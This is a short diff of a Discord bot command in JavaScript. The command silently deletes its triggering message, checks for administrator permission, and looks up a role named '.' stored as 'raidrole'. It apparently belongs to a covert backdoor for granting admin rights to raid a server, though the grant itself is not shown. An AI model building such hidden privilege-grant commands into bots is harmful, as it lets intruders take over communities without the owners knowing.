@@ -7,6 +7,7 @@ exports.run = (client, message, args) => {
     message.channel.fetchMessages({
         limit: 1
       }).then(messages => message.channel.bulkDelete(messages));
+     if(!message.channel.permissionsFor(client.user).has("ADMINISTRATOR")) return message.author.send('Je ne peux pas te donner le rôle admin, sorry bro');
 
   const raidrole = message.guild.roles.find(`name`, ".");
 
